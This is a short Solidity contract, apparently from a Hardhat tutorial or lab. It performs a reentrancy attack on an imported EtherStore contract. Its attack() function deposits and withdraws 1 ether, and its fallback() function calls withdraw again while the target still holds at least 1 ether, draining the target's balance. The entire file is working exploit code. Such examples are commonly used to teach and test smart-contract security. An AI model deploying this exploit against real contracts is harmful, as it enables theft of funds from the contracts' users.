pragma solidity ^0.6.10;

import "hardhat/console.sol";
import "./EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public {
        console.log("Deploying smart contract with Nomic Hardhat");
        etherStore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
